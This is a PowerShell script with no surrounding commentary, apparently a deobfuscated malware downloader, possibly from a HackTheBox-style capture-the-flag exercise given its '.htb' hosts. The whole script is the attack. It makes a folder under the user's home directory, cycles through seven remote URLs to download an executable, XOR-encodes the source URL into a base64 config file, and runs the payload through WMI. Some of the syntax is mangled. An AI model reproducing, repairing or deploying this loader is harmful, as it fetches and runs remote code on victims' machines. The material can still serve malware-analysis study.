
System.IO.Directory.value::"CreateDirectory"($HOME + 'Jrbevk4\Ccwr_2h\')
System.Net.ServicePointManager.value::SecurityProtocol = 'Tls12'

$saved_dest_bin = $HOME + 'Jrbevk4\Ccwr_2h\Ale7g_8.exe'
$saved_conf_file = $HOME + 'Jrbevk4\Ccwr_2h\Ale7g_8.conf'

$URL = ['http://da-industrial.htb/js/9IdLP/',
        'http://daprofesional.htb/data4/hWgWjTV/',
        'https://dagranitegiare.htb/wp-admin/tV/',
        'http://www.outspokenvisions.htb/wp-includes/aWoM/',
        'http://mobsouk.htb/wp-includes/UY30R/',
        'http://biglaughs.htb/smallpotatoes/Y/',
        'https://ngllogistics.htb/adminer/W3mkB/']

$conf = [ 182 187 229 146 231 177 151 149 166 186 141 228 182 177 171 229 236 239 239 239 228 181 182 171 229 234 239 239 228 185 179 190 184 229 151 139 157 164 235 177 239 171 183 236 141 128 187 235 134 128 158 177 176 139 183 154 173 
128 175 151 238 140 183 162 228 170 173 179 229 ]

foreach ($web_dest in $URL){
    try{
        System.Net.WebClient::DownloadFile($web_dest, $saved_dest_bin);
        If ((&('Get-Item') $saved_dest_bin).Length -ge 45199) {
            ${web_dest}.('ToCharArray').Invoke() | .ForEach-Object -process { 
                ${conf} += ([byte][char]${_} -bxor 0xdf ) 
            }; 
            $conf += (228);
            System.Convert::ToBase64String(${conf}) | .out-file ${saved_conf_file}; 
            ([wmiclass](('win32_Process')).create($saved_dest_bin);
            break;
        }
    } catch{}
}